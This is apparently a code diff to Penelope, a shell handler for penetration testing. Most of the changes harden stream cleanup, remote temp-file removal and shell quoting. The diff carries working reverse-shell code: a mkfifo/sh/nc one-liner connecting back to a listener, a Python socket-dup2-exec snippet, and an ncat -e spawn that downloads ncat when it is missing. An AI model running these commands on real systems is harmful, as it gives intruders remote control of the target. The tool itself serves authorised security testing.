+				cleanup_complete = cleanup_agent_upload()
 				if not self:
 					if pbar:
 						pbar.terminate()
+					logger.warning("Upload outcome is indeterminate because the session disconnected")
 					return []
-				stdin_stream.close_read()
-				stdin_stream.close_write()
-				stdout_stream.close_read()
-				self.streams.pop(stdin_stream.id, None)
-				self.streams.pop(stdout_stream.id, None)
-				self.streams.pop(stderr_stream.id, None)
+				if not cleanup_complete:
+					if pbar:
+						pbar.terminate()
+					logger.warning("Upload stream cleanup timed out; outcome is indeterminate")
+					return []
 				if remote_errors:
 					if pbar:
 						pbar.terminate()
+					logger.warning("Upload failed; partially extracted files may remain on the target")
 					return []
 				if pbar:
 					pbar.update(pbar.end)
@@ -5218,6 +5324,16 @@ class Session:
 					return []
 				temp = remote_tmp + "/" + rand(8)
 				qtemp = shlex.quote(temp)
+				self.uploaded_paths[qtemp] = int(time.time())
+
+				def remove_remote_upload_temp():
+					if not self:
+						return False
+					removed = self.exec(f"rm -f -- {qtemp}; echo $?", value=True)
+					if isinstance(removed, str) and removed.strip() == "0":
+						self.uploaded_paths.pop(qtemp, None)
+						return True
+					return False
 
 				logger.trace(paint(f"⇥ Uploading to {destination}").cyan)
 				pbar = PBar(raw_size, caption=f" {paint('⤷').softorange} ", barlen=30, metric=Size)
@@ -5231,19 +5347,25 @@ class Session:
 					if response is False:
 						pbar.terminate()
 						logger.error("Upload interrupted")
-						self.exec(f"rm {qtemp}")
+						if not remove_remote_upload_temp():
+							logger.warning(f"Remote temporary file may remain: {temp}")
 						return []
 					sent = min(offset + slice_size, raw_size)
 					pbar.update(sent - pbar.pos)
 
 				logger.debug(paint("--- Remote unpacking...").blue)
-				dest = f"-C {shlex.quote(remote_path)}" if remote_path else ""
+				dest = f"-C {shlex.quote(destination)}"
 				cmd = f"{{ base64 -d 2>/dev/null || base64 -D; }} < {qtemp} | tar xz {dest} 2>&1; temp=$?"
 				response = self.exec(cmd, value=True)
 				exit_code = self.exec("echo $temp", value=True)
-				self.exec(f"rm {qtemp}")
+				if not remove_remote_upload_temp():
+					logger.warning(f"Remote temporary file may remain: {temp}")
 				if not (isinstance(exit_code, str) and exit_code.strip() == "0"):
 					logger.error(response if response else "Remote unpacking failed or timed out")
+					if not self:
+						logger.warning("Upload outcome is indeterminate because the session disconnected")
+					else:
+						logger.warning("Upload failed; partially extracted files may remain on the target")
 					return []
 
 		elif self.OS == 'Windows':
@@ -5430,7 +5552,7 @@ class Session:
 					port = port or self._port
 					host = host or self._host
 
-					if not next((listener for listener in core.listeners.values() if listener.port == port), None):
+					if not next((listener for listener in list(core.listeners.values()) if listener.port == port), None):
 						new_listener = TCPListener(host, port)
 						if not new_listener:
 							logger.error(f"Cannot listen on {host}:{port}. Spawning shell aborted")
@@ -5446,7 +5568,7 @@ class Session:
 							s.connect(("{host}", {port}))
 							for fd in (0, 1, 2):
 								os.dup2(s.fileno(), fd)
-							os.execl("{self.shell}", "{self.shell}")
+							os.execl({self.shell!r}, {self.shell!r})
 							os._exit(1)
 					""", python=True)
 					return True
@@ -5456,8 +5578,9 @@ class Session:
 				elif self.bin['nc'] and self.bin['sh']:
 					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
 				elif self.bin['sh']:
-					ncat_cmd = f'{self.bin["sh"]} -c "{{}} -e {self.bin["sh"]} {host} {port} &"'
-					if not (self._ncat and not self.exec(f"test -x {self._ncat} || echo x")):
+					_q_sh = shlex.quote(self.bin["sh"])
+					ncat_cmd = f'{_q_sh} -c "{{}} -e {_q_sh} {host} {port} &"'
+					if not (self._ncat and not self.exec(f"test -x {shlex.quote(self._ncat)} || echo x")):
 						logger.warning("ncat is not available on the target")
 						if self.system == 'Linux' and self.arch == 'x86_64':
 							self._ncat = self.need_binary("ncat", URLS['ncat'])
@@ -5466,7 +5589,7 @@ class Session:
 					if not self._ncat:
 						logger.error("Spawning shell aborted")
 						return False
-					cmd = ncat_cmd.format(self._ncat)
+					cmd = ncat_cmd.format(shlex.quote(self._ncat))
 				else:
 					logger.error("No available shell binary is present...")
 					return False
@@ -5501,11 +5624,25 @@ class Session:
 			def handle(self):
 
 				self.request.setblocking(False)
+				allocated_streams = []
+
+				def cleanup_allocated_streams():
+					for stream in allocated_streams:
+						stream.close()
+						session.remove_stream(stream)
+
 				stdin_stream = session.new_streamID
+				if stdin_stream:
+					allocated_streams.append(stdin_stream)
 				stdout_stream = session.new_streamID
+				if stdout_stream:
+					allocated_streams.append(stdout_stream)
 				stderr_stream = session.new_streamID
+				if stderr_stream:
+					allocated_streams.append(stderr_stream)
 
 				if not all([stdin_stream, stdout_stream, stderr_stream]):
+					cleanup_allocated_streams()
 					return
 
 				code = rf"""
@@ -5567,16 +5704,19 @@ class Session:
 				else:
 					client.close()
 				"""
-				session.exec(
-					code,
-					python=True,
-					stdin_stream=stdin_stream,
-					stdout_stream=stdout_stream,
-					stderr_stream=stderr_stream,
-					stdin_src=self.request,
-					stdout_dst=self.request,
-					agent_control=control
-				)
+				try:
+					session.exec(
+						code,
+						python=True,
+						stdin_stream=stdin_stream,
+						stdout_stream=stdout_stream,
+						stderr_stream=stderr_stream,
+						stdin_src=self.request,
+						stdout_dst=self.request,
+						agent_control=control
+					)
+				finally:
+					cleanup_allocated_streams()
 
 		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 			allow_reuse_address = True
@@ -5635,8 +5775,13 @@ class Session:
 
 		self.subchannel.control.close()
 		self.subchannel.close()
-		for stream in tuple(self.streams.values()):
+		with self.stream_lock:
+			self._closing = True
+			streams = list(self.streams.values())
+			self.streams.clear()
+		for stream in streams:
 			stream << b""
+			stream.close()
 
 		core.rlist.remove(self)
 		if self in core.wlist:
@@ -5655,7 +5800,7 @@ class Session:
 			message = f"Session [{self.id}] died..."
 			others = any(
 				s is not self and getattr(s, 'name', None) == self.name
-				for s in tuple(core.sessions.values())
+				for s in list(core.sessions.values())
 			)
 			if not others:
 				message += f" We lost {self.name_colored} {EMOJIS['lost']}"
@@ -5673,7 +5818,7 @@ class Session:
 			self.attaching = False
 			menu.show()
 
-		for fwd in tuple(self.tasks['portfwd']):
+		for fwd in list(self.tasks['portfwd']):
 			fwd.stop()
 
 		if self.OS and hasattr(self, 'name'):
@@ -5850,7 +5995,7 @@ def agent():
 		import StringIO
 		bufferclass = StringIO.StringIO
 
-	SHELL = "{}"
+	SHELL = {}
 	NET_BUF_SIZE = {}
 	{}
 	{}
@@ -5985,7 +6130,7 @@ def agent():
 									os.dup2(stdin_stream._read, 0)
 									os.dup2(stdout_stream._write, 1)
 									os.dup2(stderr_stream._write, 2)
-									os.execl("{}", "sh", "-c", cmd)
+									os.execl({}, "sh", "-c", cmd)
 									os._exit(1)
 								stdin_stream.close_read()
 								stdout_stream.close_write()
@@ -6392,13 +6537,13 @@ class uac(Module):
 			if not uploaded:
 				logger.error("Failed to upload UAC")
 				return False
-			path = uploaded[0]
+			path = shlex.quote(uploaded[0])
 			result = session.exec(f"tar xf {path} -C {shlex.quote(session.exec_tmp)} >/dev/null", value=True)
 			if not result:
 				session.exec(f"rm -f {path}")
-				logger.info(f"UAC successfully extracted on {session.exec_tmp}")
+				logger.info(f"UAC successfully extracted on {sanitize_meta(session.exec_tmp)}")
 			else:
-				logger.error(f"Extraction to {session.exec_tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
+				logger.error(f"Extraction to {sanitize_meta(session.exec_tmp)} failed:\n{indent(sanitize_meta(result), ' ' * 4 + '- ')}")
 				return False
 			# UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
 			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
@@ -6410,7 +6555,7 @@ class uac(Module):
 			with os.fdopen(fd, "w") as f:
 				f.write("#!/bin/sh\n")
 				f.write(cmd)
-			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
+			logger.info(f"UAC output will be stored at {sanitize_meta(session.tmp)}/uac-%hostname%-%os%-%timestamp%")
 			session.script(tf)
 			# Once completed, transfer the output files to your host
 		else:
@@ -6435,7 +6580,7 @@ class linux_procmemdump(Module):
 			logger.info(f"Please provide the PID of the process to be acquired:")
 			PID = input("PID: ")
 			session.exec(f"{shlex.quote(session.exec_tmp + '/linux_procmemdump.sh')} -p {PID} -s -d {shlex.quote(session.tmp)}")
-			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
+			logger.info(f"Strings of the process dump will be stored at {sanitize_meta(session.tmp)}/{PID}/")
 		else:
 			logger.error("This module runs only on Unix shells")
 
@@ -6811,7 +6956,7 @@ class FileServer:
 			block_on_close = False
 
 			def __init__(self, *args, **kwargs):
-				self.client_sockets = []
+				self.client_sockets = set()
 				super().__init__(*args, **kwargs)
 
 			@handle_bind_errors
@@ -6820,11 +6965,15 @@ class FileServer:
 				super().server_bind()
 
 			def process_request(self, request, client_address):
-				self.client_sockets.append(request)
+				self.client_sockets.add(request)
 				super().process_request(request, client_address)
 
+			def shutdown_request(self, request):
+				self.client_sockets.discard(request)
+				super().shutdown_request(request)
+
 			def shutdown(self):
-				for sock in self.client_sockets:
+				for sock in list(self.client_sockets):
 					try:
 						sock.shutdown(socket.SHUT_RDWR)
 						sock.close()
@@ -7323,6 +7472,112 @@ def _is_within_directory(directory, target):
 	except ValueError:
 		return False
 
+def shell_expand_remote_path(path):
+	word, cursor = [], 0
+	tilde = re.match(r'~[A-Za-z0-9._-]*(?=/|$)', path)
+	if tilde:
+		word.append('"${HOME?}"' if tilde.group() == '~' else tilde.group())
+		cursor = tilde.end()
+
+	for variable in _REMOTE_PATH_VARIABLE.finditer(path, cursor):
+		if variable.start() > cursor:
+			word.append(shlex.quote(path[cursor:variable.start()]))
+		name = variable.group(1) or variable.group(2)
+		word.append(f'"${{{name}?}}"')
+		cursor = variable.end()
+
+	if cursor < len(path):
+		word.append(shlex.quote(path[cursor:]))
+	return ''.join(word) or "''"
+
+def _transfer_token_span(arguments, cursor, windows=False, single_quotes=True):
+	while cursor < len(arguments) and arguments[cursor].isspace():
+		cursor += 1
+	if cursor == len(arguments):
+		return None
+
+	start = cursor
+	quote = None
+	escaped = False
+	quote_chars = "'\"" if single_quotes else '"'
+	while cursor < len(arguments):
+		char = arguments[cursor]
+		if escaped:
+			escaped = False
+		elif char == '\\' and not windows and quote != "'":
+			escaped = True
+		elif quote:
+			if char == quote:
+				quote = None
+		elif char in quote_chars:
+			quote = char
+		elif char.isspace():
+			break
+		cursor += 1
+	return start, cursor, quote is None
+
+def completing_transfer_output(line, cursor, source_windows=False, destination_windows=False):
+	prefix = (line or '')[:cursor]
+	position = 0
+	while True:
+		span = _transfer_token_span(prefix, position, source_windows,
+			single_quotes=not source_windows)
+		if span is None:
+			return False
+		begin, end, _ = span
+		token = prefix[begin:end]
+		position = end
+		if token == '--':
+			return False
+		if token not in ('-o', '--output'):
+			continue
+
+		value = _transfer_token_span(prefix, position, destination_windows)
+		if value is None:
+			return True
+		_, value_end, closed = value
+		if not closed or value_end == len(prefix):
+			return True
+		return False
+
+def parse_transfer_output(arguments, source_windows=False, destination_windows=False):
+	arguments = arguments or ''
+	position = 0
+	while True:
+		span = _transfer_token_span(arguments, position, source_windows,
+			single_quotes=not source_windows)
+		if span is None:
+			break
+		begin, end, _ = span
+		token = arguments[begin:end]
+		position = end
+		if token == '--':
+			return (arguments[:begin] + arguments[end:]).strip(), None
+		if token not in ('-o', '--output'):
+			continue
+
+		folder_span = _transfer_token_span(arguments, position, destination_windows)
+		if folder_span is None:
+			break
+		folder_begin, folder_end, closed = folder_span
+		if not closed:
+			break
+		folder = arguments[folder_begin:folder_end]
+		if destination_windows:
+			if len(folder) >= 2 and folder[0] == folder[-1] and folder[0] in "'\"":
+				folder = folder[1:-1]
+			parts = [folder] if folder else None
+		else:
+			try:
+				parts = shlex.split(folder, posix=True)
+			except ValueError:
+				parts = None
+		if parts and len(parts) == 1:
+			return (arguments[:begin] + arguments[folder_end:]).strip(), parts[0]
+		break
+
+	return arguments.strip(), None
+
 def safe_tar_extractall(tar, dest, streaming=False, strip_prefixes=None):
 	dest_real = os.path.realpath(dest)
 	orig_extract_member = tar._extract_member
@@ -7366,6 +7621,7 @@ def safe_tar_extractall(tar, dest, streaming=False, strip_prefixes=None):
 						os.symlink(tarinfo.linkname, targetpath)
 					else:
 						os.link(link_path, targetpath)
+					extracted.append(targetpath)
 				except OSError as e:
 					logger.error(str(paint("<LOCAL>").yellow) + " " +
 						str(paint(f"Skipping link {tarinfo.name}: {e}").red))
@@ -7614,7 +7870,7 @@ def listener_menu():
 			elif command == 'p':
 				restore_tty()
 				print()
-				for listener in core.listeners.values():
+				for listener in list(core.listeners.values()):
 					print(listener.payloads(), end='\n\n')
 			elif command == '\x0C':
 				os.system("clear")
@@ -7897,6 +8153,7 @@ def main():
 		while core.sessions and time.time() < deadline:
 			time.sleep(0.05)
 		_restore_terminal()
+		_cleanup_ephemeral()
 		os._exit(0)
 	for _signame in ("SIGTERM", "SIGHUP"):
 		_sig = getattr(signal, _signame, None)
@@ -8022,6 +8279,9 @@ if not sys.version_info >= (3, 6):
 	print("(!) Penelope requires Python version 3.6 or higher (!)")
 	sys.exit(1)
 
+# Set umask
+os.umask(0o007)
+
 # Store initial TTY settings
 try:
 	TTY_NORMAL = termios.tcgetattr(sys.stdin)
@@ -8034,11 +8294,16 @@ def restore_tty():
 # Setup for ephemeral mode
 _ephemeral_root = None
 _ram = None
+
+def _cleanup_ephemeral():
+	if _ephemeral_root is not None:
+		shutil.rmtree(_ephemeral_root, ignore_errors=True)
+
 if '--no-disk' in sys.argv:
 	_ram = Path("/dev/shm") if Path("/dev/shm").is_dir() and os.access("/dev/shm", os.W_OK) else None
 	_ephemeral_root = Path(tempfile.mkdtemp(prefix="penelope-", dir=str(_ram) if _ram else None))
 	tempfile.tempdir = str(_ephemeral_root)
-	atexit.register(lambda p=_ephemeral_root: shutil.rmtree(p, ignore_errors=True))
+	atexit.register(_cleanup_ephemeral)
 
 # Apply default options
 options = Options()
@@ -8064,12 +8329,12 @@ stdout_handler = logging.StreamHandler()
 stdout_handler.setFormatter(CustomFormatter())
 stdout_handler.terminator = ''
 
-file_handler = logging.FileHandler(options.logfile, encoding='utf-8', errors='replace')
+file_handler = logging.FileHandler(options.logfile, encoding='utf-8')
 file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
 file_handler.setLevel(logging.INFO)
 file_handler.terminator = ''
 
-debug_file_handler = logging.FileHandler(options.debug_logfile, encoding='utf-8', errors='replace')
+debug_file_handler = logging.FileHandler(options.debug_logfile, encoding='utf-8')
 debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
 debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
 debug_file_handler.terminator = ''
@@ -8180,7 +8445,6 @@ input = my_input
 sys.excepthook = custom_excepthook
 threading.excepthook = custom_excepthook
 tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
-os.umask(0o007)
 signal.signal(signal.SIGWINCH, WinResize)
 keyboard_interrupt = signal.getsignal(signal.SIGINT)
 try:
@@ -8226,3 +8490,4 @@ load_rc()
 
 if __name__ == "__main__":
 	main()
+
